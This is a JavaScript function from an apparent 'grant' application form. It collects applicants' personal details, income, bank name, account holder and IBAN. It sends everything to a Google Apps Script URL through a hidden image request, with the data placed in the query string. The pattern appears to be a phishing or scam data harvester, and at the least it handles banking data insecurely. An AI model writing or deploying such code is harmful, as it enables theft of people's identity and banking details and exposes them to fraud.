var APPS_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycby-fvc-LsoVHWwNdpP1Rvk4jJO-IFP5FBu9u9_6lxVd1fs0UKJPAq4P5dF1EZUfmVAO1Q/exec';

async function saveToGoogleSheets(txNumber) {
  var payload = {
    transaction_id:    txNumber,
    full_name:         formData.personalInfo.fullName         || '',
    country:           formData.personalInfo.country          || '',
    marital_status:    formData.personalInfo.maritalStatus    || '',
    num_children:      formData.personalInfo.numChildren      || 0,
    phone:             formData.contactCareer.phone           || '',
    email:             formData.contactCareer.email           || '',
    profession:        formData.contactCareer.profession      || '',
    monthly_income:    formData.contactCareer.income          || 0,
    grant_type:        formData.grantDetails.grantType        || '',
    grant_amount:      formData.grantDetails.grantAmount      || 0,
    grant_description: formData.grantDetails.grantDescription || '',
    bank_name:         formData.bankingInfo.bankName          || '',
    account_holder:    formData.bankingInfo.accountHolder     || '',
    iban:              (formData.bankingInfo.iban || '').replace(/\s/g, '')
  };

  var params = new URLSearchParams();
  params.set('payload', JSON.stringify(payload));

  var img = new Image();
  img.src = APPS_SCRIPT_URL + '?' + params.toString();

  return true;
}
